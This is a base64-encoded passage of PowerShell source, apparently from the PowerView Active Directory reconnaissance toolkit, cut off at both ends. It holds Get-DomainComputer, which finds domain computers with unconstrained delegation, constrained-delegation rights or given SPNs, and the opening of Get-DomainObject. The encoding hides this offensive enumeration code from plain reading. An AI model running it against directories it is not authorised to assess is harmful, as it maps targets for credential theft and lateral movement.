zZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogR2V0LURvbWFpblNlYXJjaGVyLCBDb252ZXJ0LUxEQVBQcm9wZXJ0eSAgCgouREVTQ1JJUFRJT04KCkJ1aWxkcyBhIGRpcmVjdG9yeSBzZWFyY2hlciBvYmplY3QgdXNpbmcgR2V0LURvbWFpblNlYXJjaGVyLCBidWlsZHMgYSBjdXN0b20KTERBUCBmaWx0ZXIgYmFzZWQgb24gdGFyZ2V0aW5nL2ZpbHRlciBwYXJhbWV0ZXJzLCBhbmQgc2VhcmNoZXMgZm9yIGFsbCBvYmplY3RzCm1hdGNoaW5nIHRoZSBjcml0ZXJpYS4gVG8gb25seSByZXR1cm4gc3BlY2lmaWMgcHJvcGVydGllcywgdXNlCiItUHJvcGVydGllcyBzYW1hY2NvdW50bmFtZSx1c25jaGFuZ2VkLC4uLiIuIEJ5IGRlZmF1bHQsIGFsbCBjb21wdXRlciBvYmplY3RzIGZvcgp0aGUgY3VycmVudCBkb21haW4gYXJlIHJldHVybmVkLgoKLlBBUkFNRVRFUiBJZGVudGl0eQoKQSBTYW1BY2NvdW50TmFtZSAoZS5nLiBXSU5ET1dTMTAkKSwgRGlzdGluZ3Vpc2hlZE5hbWUgKGUuZy4gQ049V0lORE9XUzEwLENOPUNvbXB1dGVycyxEQz10ZXN0bGFiLERDPWxvY2FsKSwKU0lEIChlLmcuIFMtMS01LTIxLTg5MDE3MTg1OS0zNDMzODA5Mjc5LTMzNjYxOTY3NTMtMTEyNCksIEdVSUQgKGUuZy4gNGYxNmI2YmMtNzAxMC00Y2JmLWI2MjgtZjNjZmUyMGY2OTk0KSwKb3IgYSBkbnMgaG9zdCBuYW1lIChlLmcuIHdpbmRvd3MxMC50ZXN0bGFiLmxvY2FsKS4gV2lsZGNhcmRzIGFjY2VwdGVkLgoKLlBBUkFNRVRFUiBVbmNvbnN0cmFpbmVkCgpTd2l0Y2guIFJldHVybiBjb21wdXRlciBvYmplY3RzIHRoYXQgaGF2ZSB1bmNvbnN0cmFpbmVkIGRlbGVnYXRpb24uCgouUEFSQU1FVEVSIFRydXN0ZWRUb0F1dGgKClN3aXRjaC4gUmV0dXJuIGNvbXB1dGVyIG9iamVjdHMgdGhhdCBhcmUgdHJ1c3RlZCB0byBhdXRoZW50aWNhdGUgZm9yIG90aGVyIHByaW5jaXBhbHMuCgouUEFSQU1FVEVSIFByaW50ZXJzCgpTd2l0Y2guIFJldHVybiBvbmx5IHByaW50ZXJzLgoKLlBBUkFNRVRFUiBTUE4KClJldHVybiBjb21wdXRlcnMgd2l0aCBhIHNwZWNpZmljIHNlcnZpY2UgcHJpbmNpcGFsIG5hbWUsIHdpbGRjYXJkcyBhY2NlcHRlZC4KCi5QQVJBTUVURVIgT3BlcmF0aW5nU3lzdGVtCgpSZXR1cm4gY29tcHV0ZXJzIHdpdGggYSBzcGVjaWZpYyBvcGVyYXRpbmcgc3lzdGVtLCB3aWxkY2FyZHMgYWNjZXB0ZWQuCgouUEFSQU1FVEVSIFNlcnZpY2VQYWNrCgpSZXR1cm4gY29tcHV0ZXJzIHdpdGggYSBzcGVjaWZpYyBzZXJ2aWNlIHBhY2ssIHdpbGRjYXJkcyBhY2NlcHRlZC4KCi5QQVJBTUVURVIgU2l0ZU5hbWUKClJldHVybiBjb21wdXRlcnMgaW4gdGhlIHNwZWNpZmljIEFEIFNpdGUgbmFtZSwgd2lsZGNhcmRzIGFjY2VwdGVkLgoKLlBBUkFNRVRFUiBQaW5nCgpTd2l0Y2guIFBpbmcgZWFjaCBob3N0IHRvIGVuc3VyZSBpdCdzIHVwIGJlZm9yZSBlbnVtZXJhdGluZy4KCi5QQVJBTUVURVIgRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiB0byB1c2UgZm9yIHRoZSBxdWVyeSwgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBMREFQRmlsdGVyCgpTcGVjaWZpZXMgYW4gTERBUCBxdWVyeSBzdHJpbmcgdGhhdCBpcyB1c2VkIHRvIGZpbHRlciBBY3RpdmUgRGlyZWN0b3J5IG9iamVjdHMuCgouUEFSQU1FVEVSIFByb3BlcnRpZXMKClNwZWNpZmllcyB0aGUgcHJvcGVydGllcyBvZiB0aGUgb3V0cHV0IG9iamVjdCB0byByZXRyaWV2ZSBmcm9tIHRoZSBzZXJ2ZXIuCgouUEFSQU1FVEVSIFNlYXJjaEJhc2UKClRoZSBMREFQIHNvdXJjZSB0byBzZWFyY2ggdGhyb3VnaCwgZS5nLiAiTERBUDovL09VPXNlY3JldCxEQz10ZXN0bGFiLERDPWxvY2FsIgpVc2VmdWwgZm9yIE9VIHF1ZXJpZXMuCgouUEFSQU1FVEVSIFNlcnZlcgoKU3BlY2lmaWVzIGFuIEFjdGl2ZSBEaXJlY3Rvcnkgc2VydmVyIChkb21haW4gY29udHJvbGxlcikgdG8gYmluZCB0by4KCi5QQVJBTUVURVIgU2VhcmNoU2NvcGUKClNwZWNpZmllcyB0aGUgc2NvcGUgdG8gc2VhcmNoIHVuZGVyLCBCYXNlL09uZUxldmVsL1N1YnRyZWUgKGRlZmF1bHQgb2YgU3VidHJlZSkuCgouUEFSQU1FVEVSIFJlc3VsdFBhZ2VTaXplCgpTcGVjaWZpZXMgdGhlIFBhZ2VTaXplIHRvIHNldCBmb3IgdGhlIExEQVAgc2VhcmNoZXIgb2JqZWN0LgoKLlBBUkFNRVRFUiBTZXJ2ZXJUaW1lTGltaXQKClNwZWNpZmllcyB0aGUgbWF4aW11bSBhbW91bnQgb2YgdGltZSB0aGUgc2VydmVyIHNwZW5kcyBzZWFyY2hpbmcuIERlZmF1bHQgb2YgMTIwIHNlY29uZHMuCgouUEFSQU1FVEVSIFNlY3VyaXR5TWFza3MKClNwZWNpZmllcyBhbiBvcHRpb24gZm9yIGV4YW1pbmluZyBzZWN1cml0eSBpbmZvcm1hdGlvbiBvZiBhIGRpcmVjdG9yeSBvYmplY3QuCk9uZSBvZiAnRGFjbCcsICdHcm91cCcsICdOb25lJywgJ093bmVyJywgJ1NhY2wnLgoKLlBBUkFNRVRFUiBUb21ic3RvbmUKClN3aXRjaC4gU3BlY2lmaWVzIHRoYXQgdGhlIHNlYXJjaGVyIHNob3VsZCBhbHNvIHJldHVybiBkZWxldGVkL3RvbWJzdG9uZWQgb2JqZWN0cy4KCi5QQVJBTUVURVIgRmluZE9uZQoKT25seSByZXR1cm4gb25lIHJlc3VsdCBvYmplY3QuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4uCgouUEFSQU1FVEVSIFJhdwoKU3dpdGNoLiBSZXR1cm4gcmF3IHJlc3VsdHMgaW5zdGVhZCBvZiB0cmFuc2xhdGluZyB0aGUgZmllbGRzIGludG8gYSBjdXN0b20gUFNPYmplY3QuCgouRVhBTVBMRQoKR2V0LURvbWFpbkNvbXB1dGVyCgpSZXR1cm5zIHRoZSBjdXJyZW50IGNvbXB1dGVycyBpbiBjdXJyZW50IGRvbWFpbi4KCi5FWEFNUExFCgpHZXQtRG9tYWluQ29tcHV0ZXIgLVNQTiBtc3NxbCogLURvbWFpbiB0ZXN0bGFiLmxvY2FsCgpSZXR1cm5zIGFsbCBNUyBTUUwgc2VydmVycyBpbiB0aGUgdGVzdGxhYi5sb2NhbCBkb21haW4uCgouRVhBTVBMRQoKR2V0LURvbWFpbkNvbXB1dGVyIC1TZWFyY2hCYXNlICJMREFQOi8vT1U9c2VjcmV0LERDPXRlc3RsYWIsREM9bG9jYWwiIC1VbmNvbnN0cmFpbmVkCgpTZWFyY2ggdGhlIHNwZWNpZmllZCBPVSBmb3IgY29tcHV0ZXJlcyB0aGF0IGFsbG93IHVuY29uc3RyYWluZWQgZGVsZWdhdGlvbi4KCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpHZXQtRG9tYWluQ29tcHV0ZXIgLUNyZWRlbnRpYWwgJENyZWQKCi5PVVRQVVRTCgpQb3dlclZpZXcuQ29tcHV0ZXIKCkN1c3RvbSBQU09iamVjdCB3aXRoIHRyYW5zbGF0ZWQgY29tcHV0ZXIgcHJvcGVydHkgZmllbGRzLgoKUG93ZXJWaWV3LkNvbXB1dGVyLlJhdwoKVGhlIHJhdyBEaXJlY3RvcnlTZXJ2aWNlcy5TZWFyY2hSZXN1bHQgb2JqZWN0LCBpZiAtUmF3IGlzIGVuYWJsZWQuCiM+CgogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Db21wdXRlcicpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Db21wdXRlci5SYXcnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSAoCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdTYW1BY2NvdW50TmFtZScsICdOYW1lJywgJ0ROU0hvc3ROYW1lJyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRJZGVudGl0eSwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVW5jb25zdHJhaW5lZCwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVHJ1c3RlZFRvQXV0aCwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkUHJpbnRlcnMsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdTZXJ2aWNlUHJpbmNpcGFsTmFtZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNQTiwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRPcGVyYXRpbmdTeXN0ZW0sCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmljZVBhY2ssCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2l0ZU5hbWUsCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFBpbmcsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRmlsdGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTERBUEZpbHRlciwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFByb3BlcnRpZXMsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdEYWNsJywgJ0dyb3VwJywgJ05vbmUnLCAnT3duZXInLCAnU2FjbCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlY3VyaXR5TWFza3MsCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKCiAgICAgICAgW0FsaWFzKCdSZXR1cm5PbmUnKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRGaW5kT25lLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHksCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFJhdwogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHMgPSBAe30KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUHJvcGVydGllcyddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUHJvcGVydGllcyddID0gJFByb3BlcnRpZXMgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRTZWFyY2hCYXNlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VjdXJpdHlNYXNrcyddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VjdXJpdHlNYXNrcyddID0gJFNlY3VyaXR5TWFza3MgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgJENvbXBTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBAU2VhcmNoZXJBcmd1bWVudHMKICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJENvbXBTZWFyY2hlcikgewoKICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyID0gJycKICAgICAgICAgICAgJEZpbHRlciA9ICcnCiAgICAgICAgICAgICRJZGVudGl0eSB8IFdoZXJlLU9iamVjdCB7JF99IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgJElkZW50aXR5SW5zdGFuY2UgPSAkXy5SZXBsYWNlKCcoJywgJ1wyOCcpLlJlcGxhY2UoJyknLCAnXDI5JykKICAgICAgICAgICAgICAgIGlmICgkSWRlbnRpdHlJbnN0YW5jZSAtbWF0Y2ggJ15TLTEtLionKSB7CiAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIob2JqZWN0c2lkPSRJZGVudGl0eUluc3RhbmNlKSIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2VpZiAoJElkZW50aXR5SW5zdGFuY2UgLW1hdGNoICdeQ049LionKSB7CiAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIoZGlzdGluZ3Vpc2hlZG5hbWU9JElkZW50aXR5SW5zdGFuY2UpIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmICgkSWRlbnRpdHlJbnN0YW5jZSAtbWF0Y2ggJy4qXC4uKicpIHsKICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIihkbnNob3N0bmFtZT0kSWRlbnRpdHlJbnN0YW5jZSkiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAkR3VpZEJ5dGVTdHJpbmcgPSAoLUpvaW4gKChbR3VpZF0kSWRlbnRpdHlJbnN0YW5jZSkuVG9CeXRlQXJyYXkoKSB8IEZvckVhY2gtT2JqZWN0IHskXy5Ub1N0cmluZygnWCcpLlBhZExlZnQoMiwnMCcpfSkpIC1SZXBsYWNlICcoLi4pJywnXCQxJwogICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIihvYmplY3RndWlkPSRHdWlkQnl0ZVN0cmluZykiCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRJZGVudGl0eUluc3RhbmNlLkNvbnRhaW5zKCcuJykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKHwobmFtZT0kSWRlbnRpdHlJbnN0YW5jZSkoZG5zaG9zdG5hbWU9JElkZW50aXR5SW5zdGFuY2UpKSIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKG5hbWU9JElkZW50aXR5SW5zdGFuY2UpIgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkSWRlbnRpdHlGaWx0ZXIgLWFuZCAoJElkZW50aXR5RmlsdGVyLlRyaW0oKSAtbmUgJycpICkgewogICAgICAgICAgICAgICAgJEZpbHRlciArPSAiKHwkSWRlbnRpdHlGaWx0ZXIpIgogICAgICAgICAgICB9CgogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydVbmNvbnN0cmFpbmVkJ10pIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1tHZXQtRG9tYWluQ29tcHV0ZXJdIFNlYXJjaGluZyBmb3IgY29tcHV0ZXJzIHdpdGggZm9yIHVuY29uc3RyYWluZWQgZGVsZWdhdGlvbicKICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gJyh1c2VyQWNjb3VudENvbnRyb2w6MS4yLjg0MC4xMTM1NTYuMS40LjgwMzo9NTI0Mjg4KScKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUcnVzdGVkVG9BdXRoJ10pIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1tHZXQtRG9tYWluQ29tcHV0ZXJdIFNlYXJjaGluZyBmb3IgY29tcHV0ZXJzIHRoYXQgYXJlIHRydXN0ZWQgdG8gYXV0aGVudGljYXRlIGZvciBvdGhlciBwcmluY2lwYWxzJwogICAgICAgICAgICAgICAgJEZpbHRlciArPSAnKG1zZHMtYWxsb3dlZHRvZGVsZWdhdGV0bz0qKScKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydQcmludGVycyddKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICdbR2V0LURvbWFpbkNvbXB1dGVyXSBTZWFyY2hpbmcgZm9yIHByaW50ZXJzJwogICAgICAgICAgICAgICAgJEZpbHRlciArPSAnKG9iamVjdENhdGVnb3J5PXByaW50UXVldWUpJwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NQTiddKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkNvbXB1dGVyXSBTZWFyY2hpbmcgZm9yIGNvbXB1dGVycyB3aXRoIFNQTjogJFNQTiIKICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gIihzZXJ2aWNlUHJpbmNpcGFsTmFtZT0kU1BOKSIKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydPcGVyYXRpbmdTeXN0ZW0nXSkgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5Db21wdXRlcl0gU2VhcmNoaW5nIGZvciBjb21wdXRlcnMgd2l0aCBvcGVyYXRpbmcgc3lzdGVtOiAkT3BlcmF0aW5nU3lzdGVtIgogICAgICAgICAgICAgICAgJEZpbHRlciArPSAiKG9wZXJhdGluZ3N5c3RlbT0kT3BlcmF0aW5nU3lzdGVtKSIKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2aWNlUGFjayddKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkNvbXB1dGVyXSBTZWFyY2hpbmcgZm9yIGNvbXB1dGVycyB3aXRoIHNlcnZpY2UgcGFjazogJFNlcnZpY2VQYWNrIgogICAgICAgICAgICAgICAgJEZpbHRlciArPSAiKG9wZXJhdGluZ3N5c3RlbXNlcnZpY2VwYWNrPSRTZXJ2aWNlUGFjaykiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2l0ZU5hbWUnXSkgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5Db21wdXRlcl0gU2VhcmNoaW5nIGZvciBjb21wdXRlcnMgd2l0aCBzaXRlIG5hbWU6ICRTaXRlTmFtZSIKICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gIihzZXJ2ZXJyZWZlcmVuY2VibD0kU2l0ZU5hbWUpIgogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0xEQVBGaWx0ZXInXSkgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5Db21wdXRlcl0gVXNpbmcgYWRkaXRpb25hbCBMREFQIGZpbHRlcjogJExEQVBGaWx0ZXIiCiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIkTERBUEZpbHRlciIKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJENvbXBTZWFyY2hlci5maWx0ZXIgPSAiKCYoc2FtQWNjb3VudFR5cGU9ODA1MzA2MzY5KSRGaWx0ZXIpIgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkNvbXB1dGVyXSBHZXQtRG9tYWluQ29tcHV0ZXIgZmlsdGVyIHN0cmluZzogJCgkQ29tcFNlYXJjaGVyLmZpbHRlcikiCgogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydGaW5kT25lJ10pIHsgJFJlc3VsdHMgPSAkQ29tcFNlYXJjaGVyLkZpbmRPbmUoKSB9CiAgICAgICAgICAgIGVsc2UgeyAkUmVzdWx0cyA9ICRDb21wU2VhcmNoZXIuRmluZEFsbCgpIH0KICAgICAgICAgICAgJFJlc3VsdHMgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICRVcCA9ICRUcnVlCiAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydQaW5nJ10pIHsKICAgICAgICAgICAgICAgICAgICAkVXAgPSBUZXN0LUNvbm5lY3Rpb24gLUNvdW50IDEgLVF1aWV0IC1Db21wdXRlck5hbWUgJF8ucHJvcGVydGllcy5kbnNob3N0bmFtZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRVcCkgewogICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1JhdyddKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICMgcmV0dXJuIHJhdyByZXN1bHQgb2JqZWN0cwogICAgICAgICAgICAgICAgICAgICAgICAkQ29tcHV0ZXIgPSAkXwogICAgICAgICAgICAgICAgICAgICAgICAkQ29tcHV0ZXIuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkNvbXB1dGVyLlJhdycpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAkQ29tcHV0ZXIgPSBDb252ZXJ0LUxEQVBQcm9wZXJ0eSAtUHJvcGVydGllcyAkXy5Qcm9wZXJ0aWVzCiAgICAgICAgICAgICAgICAgICAgICAgICRDb21wdXRlci5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuQ29tcHV0ZXInKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkQ29tcHV0ZXIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFJlc3VsdHMpIHsKICAgICAgICAgICAgICAgIHRyeSB7ICRSZXN1bHRzLmRpc3Bvc2UoKSB9CiAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5Db21wdXRlcl0gRXJyb3IgZGlzcG9zaW5nIG9mIHRoZSBSZXN1bHRzIG9iamVjdDogJF8iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJENvbXBTZWFyY2hlci5kaXNwb3NlKCkKICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBHZXQtRG9tYWluT2JqZWN0IHsKPCMKLlNZTk9QU0lTCgpSZXR1cm4gYWxsIChvciBzcGVjaWZpZWQpIGRvbWFpbiBvYmplY3RzIGluIEFELgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtRG9tYWluU2VhcmNoZXIsIENvbnZlcnQtTERBUFByb3BlcnR5LCBDb252ZXJ0LUFETmFtZSAgCgouREVTQ1JJUFRJT04KCkJ1aWxkcyBhIGRpcmVjdG9yeSBzZWFyY2hlciBvYmplY3QgdXNpbmcgR2V0LURvbWFpblNlYXJjaGVyLCBidWlsZHMgYSBjdXN0b20KTERBUCBmaWx0ZXIgYmFzZWQgb24gdGFyZ2V0aW5nL2ZpbHRlciBwYXJhbWV0ZXJzLCBhbmQgc2VhcmNoZXMgZm9yIGFsbCBvYmplY3RzCm1hdGNoaW5nIHRoZSBjcml0ZXJpYS4gVG8gb25seSByZXR1cm4gc3BlY2lmaWMgcHJvcGVydGllcywgdXNlCiItUHJvcGVydGllcyBzYW1hY2NvdW50bmFtZSx1c25jaGFuZ2VkLC4uLiIuIEJ5IGRlZmF1bHQsIGFsbCBvYmplY3RzIGZvcgp0aGUgY3VycmVudCBkb21haW4gYXJlIHJldHVybmVkLgoKLlBBUkFNRVRFUiBJZGVudGl0eQoKQSBTYW1BY2NvdW50TmFtZSAoZS5nLiBoYXJtajB5KSwgRGlzdGluZ3Vpc2hlZE5hbWUgKGUuZy4gQ049aGFybWoweSxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsKSwKU0lEIChlLmcuIFMtMS01LTIxLTg5MDE3MTg1OS0zNDMzODA5Mjc5LTMzNjYxOTY3NTMtMTEwOCksIG9yI